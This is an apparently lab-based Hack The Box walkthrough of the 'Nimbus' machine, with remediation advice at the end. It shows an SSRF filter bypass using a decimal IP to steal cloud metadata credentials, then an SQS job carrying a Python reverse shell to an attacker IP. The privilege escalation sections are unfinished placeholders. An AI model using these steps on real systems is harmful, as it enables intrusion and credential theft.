---
title: 'HTB Nimbus Walkthrough'
description: 'Step-by-step Hack The Box Nimbus walkthrough. Exploit SSRF filter bypass, extract AWS IAM credentials, and abuse SQS queue for remote code execution.'
date: 2026-06-21
password: "193f558325db31c619ab8f1a967519e9"
difficulty: Hard
os: Linux
authors:
- name: Bilash J. Shahi
  title: Cybersecurity Professional
  picture: https://avatars.githubusercontent.com/elodvk
  url: https://purplesec.org
tags:
- Hack The Box
- HTB
- Hard
- Linux
- Walkthrough
- SSRF
- Filter Bypass
- AWS
- SQS
image: assets/nimbus/nimbus_banner.png
---

# 🛡️ HTB Nimbus Walkthrough

## Machine Overview

**Attack Chain Summary:** The engagement begins with identifying a Server-Side Request Forgery (SSRF) vulnerability in an internal job scheduler's preview endpoint. By bypassing the internal IP filter using decimal integer conversion, temporary AWS STS credentials for an IAM role are extracted. These credentials allow interaction with the internal mock AWS environment, specifically an SQS queue used for job scheduling. Submitting a malicious JSON job containing a Python reverse shell payload directly to the queue results in remote code execution on the backend worker container.

| Attribute | Details |
| :--- | :--- |
| **Machine Name** | Nimbus |
| **Operating System** | Linux |
| **Difficulty** | Hard |
| **IP Address** | 10.129.173.194 |

---

## Reconnaissance & Enumeration

The engagement starts with a standard Nmap scan to identify exposed services on the target, understand the technology stack, and pinpoint potential entry vectors.

### Port Scanning

A comprehensive Nmap scan is executed to identify active TCP ports. The `-sC` flag runs default Nmap scripts to gather supplementary information, while `-sV` probes open ports to determine exact service versions. The `-T4` flag optimizes the scan speed.

```shell title="Nmap Service Scan"
nmap -sC -sV -T4 -oA reports/nimbus_ 10.129.173.194
```

```text title="Nmap Output"
Host is up (0.22s latency).
Not shown: 998 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 9.6p1 Ubuntu 3ubuntu13.16 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 eb:ab:8f:be:99:02:0b:3e:c4:1c:83:b2:66:2f:17:13 (ECDSA)
|_  256 c1:69:ab:84:f3:88:8b:b3:8a:ae:e2:28:35:54:35:0b (ED25519)
80/tcp open  http    nginx 1.24.0 (Ubuntu)
|_http-title: Did not follow redirect to http://nimbus.htb/
|_http-server-header: nginx/1.24.0 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

| Port | State | Service | Version | Notes |
| :--- | :--- | :--- | :--- | :--- |
| **22/tcp** | Open | SSH | OpenSSH 9.6p1 | Standard secure shell access. |
| **80/tcp** | Open | HTTP | nginx 1.24.0 | Web server immediately redirecting to `http://nimbus.htb/`. |

### Service Identification & Web Footprinting

Navigating to the web server's IP address results in a redirect to `http://nimbus.htb/`. The local DNS must be updated to resolve this hostname.

```shell title="Updating Local DNS"
echo "10.129.173.194  nimbus.htb aws.nimbus.htb" | sudo tee -a /etc/hosts
```

Visiting `http://nimbus.htb` reveals an internal job scheduler dashboard named **Nimbus**. The application explicitly states that Nimbus runs scheduled background jobs across a worker fleet using YAML configuration files.

![Nimbus - Internal Job Scheduler](assets/nimbus/nimbus-job-scheduler.png "http://nimbus.htb/")

The application's health check API endpoint at `/api/v1/health` leaks critical architectural information.

```shell title="Health API Check"
curl http://nimbus.htb/api/v1/health
```

```json title="Health Response"
{
  "services": {
    "queue": {
      "endpoint": "http://aws.nimbus.htb",
      "status": "ok"
    },
    "scheduler": {
      "endpoint": "http://aws.nimbus.htb",
      "status": "ok"
    },
    "storage": {
      "endpoint": "http://aws.nimbus.htb",
      "status": "ok"
    }
  },
  "status": "healthy",
  "version": "1.4.2"
}
```

The response indicates that the backend relies on an internal mock AWS environment hosted at `aws.nimbus.htb` (which was preemptively added to the `/etc/hosts` file above). Accessing it directly returns a `403 Forbidden` error.

---

## Initial Foothold

The discovery of the internal job scheduler and the backend AWS dependency immediately points to Server-Side Request Forgery (SSRF) as a potential attack vector to pivot into the internal cloud environment.

### The Vulnerability

The application features a `/jobs/preview` endpoint that accepts a `url` parameter, fetches its content, and parses the YAML. This functionality is vulnerable to SSRF. While a blacklist filter blocks standard internal IP addresses (such as the AWS metadata IP `169.254.169.254`), it fails to account for alternative IP representations, allowing an attacker to query the metadata service and leak IAM credentials.

Furthermore, the backend SQS (Simple Queue Service) handler blindly trusts messages submitted to the queue. By executing jobs via `python3 -c` using unsanitized JSON data, it allows arbitrary code execution.

### Exploitation

First, the outbound request behavior is verified by pointing the application to an external attacker-controlled server.

```shell title="Triggering Outbound Request"
curl -X POST http://nimbus.htb/jobs/preview \
  --data-urlencode 'url=http://10.10.15.83:8000/probe.yaml'
```

To steal AWS credentials, the internal metadata service at `169.254.169.254` must be queried. To bypass the naive IP filter, the IP is converted to its decimal integer format (`2852039166`). Additionally, a dummy `.yaml` query parameter is appended to satisfy the application's file extension check.

```shell title="Extracting AWS Credentials via SSRF"
curl -X POST http://nimbus.htb/jobs/preview \
  --data-urlencode 'url=http://2852039166/latest/meta-data/iam/security-credentials/nimbus-web-role?x=.yaml'
```

```json title="Leaked IAM Credentials"
{
  "Code": "Success",
  "LastUpdated": "2026-06-21T09:15:09Z",
  "Type": "AWS-HMAC",
  "AccessKeyId": "ASIAQX4PG7L2K9M3N5R8",
  "SecretAccessKey": "bXJ7K8mP/q2Hf+vN9wT4LcRe5Y1Aoz3DhU6gKjQs",
  "Token": "IQoJb3JpZ2luX2VjEHQaCXVzLWVhc3QtMSJGMEQCIBhV9zPmK3wQjL4nT8vR2xY7AoFqUk5HsP6BeMcW1aDgAiAR4tNoXzKp8VnJqL7mC3xY9FhWdQ5GBPmRkX2vT8jY6yqsAQiK//////////8BEAEaDDAwMDAwMDAwMDAwMCIMNZ5tQ7vEX2pKlHfqKtoBQwK5HmBcN4gXjVrUe1Pk9YsZ7DqWfThN3bMRoLYyJsKn8GpVxAcQ5VeWk2HiqXbF6CnXmM4PdYpL3rJzKqGtNvBfHcWyXa8jPzTn5LRMkV1QbWdAyKpGfHzNvU8TmEcL2qPdRhJsKgGn3VyXmFbBcNJ7QrHe5VpDxKfM",
  "Expiration": "2026-06-21T15:15:09Z"
}
```

With valid credentials, the local AWS CLI environment is configured to interact with the internal `aws.nimbus.htb` mock environment.

```shell title="Configuring AWS CLI"
export AWS_ACCESS_KEY_ID='ASIAQX4PG7L2K9M3N5R8'
export AWS_SECRET_ACCESS_KEY='bXJ7K8mP/q2Hf+vN9wT4LcRe5Y1Aoz3DhU6gKjQs'
export AWS_SESSION_TOKEN='IQoJb3JpZ2luX2VjEHQaCXVzLWVhc3QtMSJGMEQCIBhV9zPmK3wQjL4nT8vR2xY7AoFqUk5HsP6BeMcW1aDgAiAR4tNoXzKp8VnJqL7mC3xY9FhWdQ5GBPmRkX2vT8jY6yqsAQiK//////////8BEAEaDDAwMDAwMDAwMDAwMCIMNZ5tQ7vEX2pKlHfqKtoBQwK5HmBcN4gXjVrUe1Pk9YsZ7DqWfThN3bMRoLYyJsKn8GpVxAcQ5VeWk2HiqXbF6CnXmM4PdYpL3rJzKqGtNvBfHcWyXa8jPzTn5LRMkV1QbWdAyKpGfHzNvU8TmEcL2qPdRhJsKgGn3VyXmFbBcNJ7QrHe5VpDxKfM'
export AWS_DEFAULT_REGION=us-east-1
```

Enumerating the SQS (Simple Queue Service) queues reveals the `nimbus-jobs` queue used by the backend workers.

```shell title="Listing SQS Queues"
aws --endpoint-url http://aws.nimbus.htb sqs list-queues --output text
```

```text title="AWS SQS Output"
QUEUEURLS	http://floci:4566/847219365028/nimbus-jobs
```

### Reverse Shell & Stabilization

Since the application processes jobs submitted to this queue by executing the provided `script` parameter using `python3 -c`, arbitrary code execution is possible. A malicious JSON payload is submitted directly to the SQS queue, instructing the worker to spawn a reverse shell.

First, a netcat listener is started on the attack machine:

```shell title="Starting Listener"
nc -lvnp 4444
```

Then, the malicious payload is sent to the queue:

```shell title="Submitting Malicious Job to SQS"
aws --endpoint-url http://aws.nimbus.htb sqs send-message \
  --queue-url http://aws.nimbus.htb/847219365028/nimbus-jobs \
  --message-body '{
    "name": "reverse_shell",
    "schedule": "* * * * *",
    "runtime": "python3.11",
    "script": "import os, pty, socket; s = socket.socket(); s.connect((\"10.10.14.71\", 4444)); [os.dup2(s.fileno(), fd) for fd in (0, 1, 2)]; pty.spawn(\"/bin/bash\")"
  }'
```

The backend worker processes the job, establishing a reverse shell connection back to the attacker.

```text title="Reverse Shell Established"
$ id
uid=1000(worker) gid=1000(worker) groups=1000(worker)
$ hostname
23c094f7b01b
```

### User Flag

With a stable foothold in the worker container, the user flag is retrieved.

```shell title="Capturing User Flag"
cat /home/worker/user.txt
```

---

## Privilege Escalation

### Enumeration for PrivEsc

<!-- TODO: Missing data. Please provide the enumeration steps and findings that led to identifying the privilege escalation vector for Nimbus. -->

### The Misconfiguration

<!-- TODO: Missing data. Please explain the underlying misconfiguration or vulnerability that allows privilege escalation. -->

### Exploitation

<!-- TODO: Missing data. Please provide the exact commands and output used to escalate to root. -->

### Root Flag

<!-- TODO: Missing data. Please provide the command and context for capturing the root flag. -->

---

## Conclusion & Takeaways

### Vulnerability Remediation

1. **SSRF and Weak IP Filtering:** The application relies on string-based blacklisting to block internal requests. Remediation requires implementing a strict allow-list for external domains or utilizing dedicated SSRF-protection libraries that resolve the hostname and validate the target IP *before* initiating the request, actively blocking local and private IP ranges regardless of their format (decimal, octal, hex).
2. **Overly Permissive IAM Credentials:** The AWS credentials assigned to the `nimbus-web-role` possess excessive permissions, allowing an attacker to blindly inject arbitrary messages directly into the internal queue. Apply the Principle of Least Privilege (PoLP) by restricting the role's SQS actions strictly to what the web application requires.
3. **Insecure Deserialization / Unsandboxed Execution:** The backend worker processes SQS jobs by passing unsanitized JSON data into a direct Python `exec()` or `python3 -c` invocation. Jobs should be executed within strictly sandboxed environments, and executable code should never be accepted as raw string input from user-controllable queues.

### Key Lessons

*   **IP Obfuscation Bypasses Filters:** Security controls that rely on naive string matching can easily be bypassed. Attackers frequently convert IPs to decimal integer (`2852039166`), octal, or hex formats to bypass basic WAF and application-level filters.
*   **Cloud Architecture Increases Attack Surface:** Modern applications increasingly rely on loosely coupled components like message queues (SQS). If an attacker can compromise a single service (like obtaining STS credentials via SSRF), they can often bypass the front-end web application entirely and directly attack the backend infrastructure via those internal APIs.